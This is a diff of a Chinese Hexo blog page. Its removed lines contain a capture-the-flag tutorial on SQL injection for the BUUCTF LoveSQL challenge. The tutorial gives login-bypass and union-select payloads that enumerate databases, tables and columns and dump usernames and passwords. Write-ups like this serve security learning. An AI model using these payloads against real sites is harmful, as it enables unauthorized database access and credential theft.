@@ -20,41 +20,30 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="目前对于sql注入的学习还存在于简单的联合注入，本文是对注入语句的一个总结">
-<meta property="og:type" content="article">
-<meta property="og:title" content="sql注入初阶学习">
-<meta property="og:url" content="http://example.com/2021/11/10/sql%E6%B3%A8%E5%85%A5%E5%88%9D%E9%98%B6/index.html">
+  <meta name="description" content="学而后知">
+<meta property="og:type" content="website">
+<meta property="og:title" content="cr0fyの博客">
+<meta property="og:url" content="http://example.com/page/2/index.html">
 <meta property="og:site_name" content="cr0fyの博客">
-<meta property="og:description" content="目前对于sql注入的学习还存在于简单的联合注入，本文是对注入语句的一个总结">
+<meta property="og:description" content="学而后知">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/LoveSQL1.png">
-<meta property="og:image" content="http://example.com/images/image-20211116185553893.png">
-<meta property="og:image" content="http://example.com/images/image-20211116185722060.png">
-<meta property="og:image" content="http://example.com/images/image-20211116190234533.png">
-<meta property="og:image" content="http://example.com/images/image-20211116190401811.png">
-<meta property="og:image" content="http://example.com/images/image-20211116190739835.png">
-<meta property="og:image" content="http://example.com/images/image-20211116191123002.png">
-<meta property="og:image" content="http://example.com/images/image-20211116191205681.png">
-<meta property="article:published_time" content="2021-11-10T13:21:49.000Z">
-<meta property="article:modified_time" content="2021-11-16T12:51:55.404Z">
 <meta property="article:author" content="cr0fy">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/LoveSQL1.png">
 
-<link rel="canonical" href="http://example.com/2021/11/10/sql%E6%B3%A8%E5%85%A5%E5%88%9D%E9%98%B6/">
+<link rel="canonical" href="http://example.com/page/2/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : false,
-    isPost : true,
+    isHome : true,
+    isPost : false,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>sql注入初阶学习 | cr0fyの博客</title>
+  <title>cr0fyの博客</title>
   
 
 
@@ -164,14 +153,13 @@
         <div class="content-wrap">
           
 
-          <div class="content post posts-expand">
+          <div class="content index posts-expand">
             
-
-    
+      
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/10/sql%E6%B3%A8%E5%85%A5%E5%88%9D%E9%98%B6/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/04/2021%E4%BA%91%E7%88%86%E6%9D%AF_%E5%9B%9B%E6%A0%A1%E8%81%94%E8%80%83/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -183,9 +171,10 @@
       <meta itemprop="name" content="cr0fyの博客">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          sql注入初阶学习
-        </h1>
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/09/04/2021%E4%BA%91%E7%88%86%E6%9D%AF_%E5%9B%9B%E6%A0%A1%E8%81%94%E8%80%83/" class="post-title-link" itemprop="url">2021云爆杯_四校联考</a>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -194,14 +183,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2021-11-10 21:21:49" itemprop="dateCreated datePublished" datetime="2021-11-10T21:21:49+08:00">2021-11-10</time>
+              <time title="创建时间：2021-09-04 10:24:38" itemprop="dateCreated datePublished" datetime="2021-09-04T10:24:38+08:00">2021-09-04</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-11-16 20:51:55" itemprop="dateModified" datetime="2021-11-16T20:51:55+08:00">2021-11-16</time>
+                <time title="修改时间：2022-02-11 20:56:09" itemprop="dateModified" datetime="2022-02-11T20:56:09+08:00">2022-02-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -209,18 +198,11 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+                  <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
                 </span>
             </span>
 
           
-            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span>
 
         </div>
       </header>
@@ -231,87 +213,34 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>目前对于sql注入的学习还存在于简单的联合注入，本文是对注入语句的一个总结</p>
-<span id="more"></span>
-
-<h1 id="尝试语句"><a href="#尝试语句" class="headerlink" title="尝试语句"></a>尝试语句</h1><p>大部分sql语句都是</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE <span class="attribute">id</span>=<span class="string">&#x27;$id&#x27;</span> </span><br></pre></td></tr></table></figure>
-
-<p>这个形式只需要id=1’#  或者 id=1’–+ 或者id=1’’</p>
-<p>对于$id,其中 ‘  是为了闭合sql语句中第一个 ‘  ，形成’1’，而#和–+是为了把后面的引号注释掉,也可以再加一个引号将其闭合</p>
-<p>形成</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE <span class="attribute">id</span>=<span class="string">&#x27;1&#x27;</span>#&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>最终识别的就是查询id=1的内容</p>
-<p>也可以尝试一下万能密码 </p>
-<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">admin</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27; =  &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>说不定有惊喜</p>
-<p>再这里举个例子，BUUCTF中的[极客大挑战 2019]LoveSQL</p>
-<h1 id="爆字段数"><a href="#爆字段数" class="headerlink" title="爆字段数"></a>爆字段数</h1><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">1</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>当输入到1’ order by 4 #后报错</p>
-<p><img src="/images/LoveSQL1.png" alt="Alt text"></p>
-<p>说明只有3个字段数</p>
-<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><h2 id="回显定位"><a href="#回显定位" class="headerlink" title="回显定位"></a>回显定位</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>; <span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20211116185553893.png" alt="Alt text"></p>
-<p>回显定位显示再2和3上可以使用sql语句</p>
-<h2 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a>查数据库</h2><p>1’ union select 1,database(),3#</p>
-<p><img src="/images/image-20211116185722060.png" alt="image-20211116185722060"></p>
-<p>database()函数可以显示他依赖的数据库</p>
-<p>或者可以查询所有的数据库名自己判断</p>
-<figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">union</span> select <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20211116190234533.png" alt="image-20211116190234533"></p>
-<h2 id="爆数据表"><a href="#爆数据表" class="headerlink" title="爆数据表"></a>爆数据表</h2><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()#</span><br></pre></td></tr></table></figure>
-
-<p>或者</p>
-<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=geek#</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20211116190401811.png" alt="image-20211116190401811"></p>
-<p>有两个数据表</p>
-<h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><p>分别对它们进行查询</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>geekuser<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> union select 1,2,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_schema</span>=database() <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">&#x27;l0ve1ysq1&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20211116190739835.png" alt="image-20211116190739835"></p>
-<p>两个都是这个</p>
-<h2 id="爆破数据"><a href="#爆破数据" class="headerlink" title="爆破数据"></a>爆破数据</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; union select 1,2,group_concat(id,username,password) from geekuser#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> union select 1,2,group_concat(id,username,password) <span class="keyword">from</span> l0ve1ysq1#</span><br></pre></td></tr></table></figure>
-
-<p>最终查询到flag在l0ve1ysq1数据表中</p>
-<p><img src="/images/image-20211116191123002.png" alt="image-20211116191123002"></p>
-<p>文字有点长，可以缩小屏幕或者看源代码得到flag</p>
-<p><img src="/images/image-20211116191205681.png" alt="image-20211116191205681"></p>
-<p>本题是作为<strong>无过滤联合查询</strong>的经典例子使用</p>
-
+          <p>内部赛</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/09/04/2021%E4%BA%91%E7%88%86%E6%9D%AF_%E5%9B%9B%E6%A0%A1%E8%81%94%E8%80%83/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
     </div>
 
     
     
     
-
       <footer class="post-footer">
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2021/09/14/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0%5B1%5Dweb/" rel="prev" title="BUU刷题日记[1]web">
-      <i class="fa fa-chevron-left"></i> BUU刷题日记[1]web
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2021/11/15/%E5%AF%B9%E4%BA%8Emd5%E4%B8%8Esha1%E7%9A%84%E5%BC%BA%E5%BC%B1%E7%A2%B0%E6%92%9E/" rel="next" title="对于md5与sha1的强弱碰撞">
-      对于md5与sha1的强弱碰撞 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
+        <div class="post-eof"></div>
       </footer>
-    
   </article>
   
   
   
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
 
 
 
@@ -363,7 +292,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.</span> <span class="nav-text">尝试语句</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%88%86%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-number">2.</span> <span class="nav-text">爆字段数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">联合注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9E%E6%98%BE%E5%AE%9A%E4%BD%8D"><span class="nav-number">3.1.</span> <span class="nav-text">回显定位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">3.2.</span> <span class="nav-text">查数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%E8%A1%A8"><span class="nav-number">3.3.</span> <span class="nav-text">爆数据表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E5%AD%97%E6%AE%B5"><span class="nav-number">3.4.</span> <span class="nav-text">爆字段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE"><span class="nav-number">3.5.</span> <span class="nav-text">爆破数据</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
